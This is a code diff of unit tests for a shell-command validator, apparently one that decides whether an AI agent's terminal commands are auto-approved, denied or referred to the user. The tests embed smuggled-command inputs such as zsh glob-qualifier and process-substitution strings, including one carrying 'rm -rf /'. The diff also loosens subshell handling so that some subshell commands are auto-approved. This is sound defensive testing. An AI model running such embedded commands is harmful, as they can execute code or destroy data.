+				expect(getCommandDecision("cat =(whoami)", ["cat"], [])).toBe("ask_user")
+				expect(getCommandDecision("diff =(cmd1) =(cmd2)", ["diff"], [])).toBe("ask_user")
+				expect(getCommandDecision("echo test =(date)", ["echo"], [])).toBe("ask_user")
+
+				// Combined with denied commands
+				expect(getCommandDecision("rm =(echo test)", ["echo"], ["rm"])).toBe("auto_deny")
+			})
+
+			it("prevents auto-approval for zsh glob qualifier exploits", () => {
+				// The zsh glob qualifier exploit with code execution
+				const globExploit = "ls *(e:whoami:)"
+				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
+				expect(getCommandDecision(globExploit, ["ls", "echo"], [])).toBe("ask_user")
+
+				// Various forms should all be blocked
+				expect(getCommandDecision("cat ?(e:rm -rf /:)", ["cat"], [])).toBe("ask_user")
+				expect(getCommandDecision("echo +(e:date:)", ["echo"], [])).toBe("ask_user")
+				expect(getCommandDecision("touch @(e:pwd:)", ["touch"], [])).toBe("ask_user")
+				expect(getCommandDecision("rm !(e:ls:)", ["rm"], [])).toBe("ask_user") // rm not in allowlist, has dangerous pattern
+
+				// Combined with denied commands
+				expect(getCommandDecision("rm *(e:echo test:)", ["echo"], ["rm"])).toBe("auto_deny")
+
+				// Multiple glob qualifiers
+				expect(getCommandDecision("ls *(e:whoami:) ?(e:pwd:)", ["ls"], [])).toBe("ask_user")
+			})
+		})
+
 		it("returns auto_deny for commands with any sub-command auto-denied", () => {
 			expect(getCommandDecision("npm test", allowedCommands, deniedCommands)).toBe("auto_deny")
 			expect(getCommandDecision("npm install && npm test", allowedCommands, deniedCommands)).toBe("auto_deny")
@@ -680,12 +1026,22 @@ describe("Unified Command Decision Functions", () => {
 			expect(getCommandDecision("npm install && dangerous", allowedCommands, deniedCommands)).toBe("ask_user")
 		})
 
-		it("returns auto_deny for subshell commands when denylist is present", () => {
-			expect(getCommandDecision("npm install $(echo test)", allowedCommands, deniedCommands)).toBe("auto_deny")
-			expect(getCommandDecision("npm install `echo test`", allowedCommands, deniedCommands)).toBe("auto_deny")
+		it("properly validates subshell commands by checking all parsed commands", () => {
+			// Subshells without denied prefixes should be auto-approved if all commands are allowed
+			expect(getCommandDecision("npm install $(echo test)", allowedCommands, deniedCommands)).toBe("auto_approve")
+			expect(getCommandDecision("npm install `echo test`", allowedCommands, deniedCommands)).toBe("auto_approve")
+
+			// Subshells with denied prefixes should be auto-denied
+			expect(getCommandDecision("npm install $(npm test)", allowedCommands, deniedCommands)).toBe("auto_deny")
+			expect(getCommandDecision("npm install `npm test --coverage`", allowedCommands, deniedCommands)).toBe(
+				"auto_deny",
+			)
+
+			// Main command with denied prefix should also be auto-denied
+			expect(getCommandDecision("npm test $(echo hello)", allowedCommands, deniedCommands)).toBe("auto_deny")
 		})
 
-		it("allows subshell commands when no denylist is present", () => {
+		it("properly validates subshell commands when no denylist is present", () => {
 			expect(getCommandDecision("npm install $(echo test)", allowedCommands)).toBe("auto_approve")
 			expect(getCommandDecision("npm install `echo test`", allowedCommands)).toBe("auto_approve")
 		})
@@ -726,39 +1082,6 @@ describe("Unified Command Decision Functions", () => {
 			// Ask user: commands that match neither list
 			expect(getCommandDecision("dangerous", allowed, denied)).toBe("ask_user")
 			expect(getCommandDecision("npm install && dangerous", allowed, denied)).toBe("ask_user")
-		})
-	})
-
-	describe("Integration with existing functions", () => {
-		it("maintains backward compatibility with existing behavior", () => {
-			const allowedCommands = ["npm", "echo"]
-			const deniedCommands = ["npm test"]
-
-			// Test that new unified functions produce same results as old separate functions
-			const testCommands = [
-				"npm install", // should be auto-approved
-				"npm test", // should be auto-denied
-				"dangerous", // should ask user
-				"echo hello", // should be auto-approved
-			]
-
-			testCommands.forEach((cmd) => {
-				const decision = getCommandDecision(cmd, allowedCommands, deniedCommands)
-				const oldApproved = isAutoApprovedCommand(cmd, allowedCommands, deniedCommands)
-				const oldDenied = isAutoDeniedCommand(cmd, allowedCommands, deniedCommands)
-
-				// Verify consistency
-				if (decision === "auto_approve") {
-					expect(oldApproved).toBe(true)
-					expect(oldDenied).toBe(false)
-				} else if (decision === "auto_deny") {
-					expect(oldApproved).toBe(false)
-					expect(oldDenied).toBe(true)
-				} else if (decision === "ask_user") {
-					expect(oldApproved).toBe(false)
-					expect(oldDenied).toBe(false)
-				}
-			})
 		})
 	})
 
@@ -821,7 +1144,6 @@ describe("Unified Command Decision Functions", () => {
 
 					expect(details.decision).toBe("auto_approve")
 					expect(details.subCommands).toEqual(["npm install", "echo done"])
-					expect(details.hasSubshells).toBe(false)
 					expect(details.allowedMatches).toHaveLength(2)
 					expect(details.deniedMatches).toHaveLength(2)
 
@@ -834,8 +1156,11 @@ describe("Unified Command Decision Functions", () => {
 
 				it("detects subshells correctly", () => {
 					const details = validator.getValidationDetails("npm install $(echo test)")
-					expect(details.hasSubshells).toBe(true)
-					expect(details.decision).toBe("auto_deny") // blocked due to subshells with denylist
+					expect(details.decision).toBe("auto_approve") // all commands are allowed
+
+					// Test with denied prefix in subshell
+					const detailsWithDenied = validator.getValidationDetails("npm install $(npm test)")
+					expect(detailsWithDenied.decision).toBe("auto_deny") // npm test is denied
 				})
 
 				it("handles complex command chains", () => {
@@ -927,6 +1252,41 @@ describe("Unified Command Decision Functions", () => {
 				const validator = createCommandValidator(["npm"])
 				expect(validator.validateCommand("npm test")).toBe("auto_approve")
 				expect(validator.validateCommand("dangerous")).toBe("ask_user")
+			})
+		})
+
+		describe("Subshell edge cases", () => {
+			it("handles multiple subshells correctly", () => {
+				const validator = createCommandValidator(["echo", "npm"], ["rm", "sudo"])
+
+				// Multiple subshells, none with denied prefixes but subshell commands not in allowlist
+				// parseCommand extracts subshells as separate commands, so date and pwd are not allowed
+				expect(validator.validateCommand("echo $(date) $(pwd)")).toBe("ask_user")
+
+				// Multiple subshells, one with denied prefix
+				expect(validator.validateCommand("echo $(date) $(rm file)")).toBe("auto_deny")
+
+				// Nested subshells - validates individual parsed commands
+				expect(validator.validateCommand("echo $(echo $(date))")).toBe("ask_user")
+				expect(validator.validateCommand("echo $(echo $(rm file))")).toBe("ask_user") // complex nested parsing with mixed validation results
+			})
+
+			it("handles complex commands with subshells", () => {
+				const validator = createCommandValidator(["npm", "git", "echo"], ["git push", "npm publish"])
+
+				// Subshell with allowed command - git status is extracted as separate command
+				// Since "git status" starts with "git" which is allowed, it's approved
+				expect(validator.validateCommand("npm run $(git status)")).toBe("auto_approve")
+
+				// Subshell with denied command
+				expect(validator.validateCommand("npm run $(git push origin)")).toBe("auto_deny")
+
+				// Main command denied, subshell allowed
+				expect(validator.validateCommand("git push $(echo origin)")).toBe("auto_deny")
+
+				// Complex chain with subshells - need echo in allowlist
+				expect(validator.validateCommand("npm install && echo $(git status) && npm test")).toBe("auto_approve")
+				expect(validator.validateCommand("npm install && echo $(git push) && npm test")).toBe("auto_deny")
 			})
 		})
 
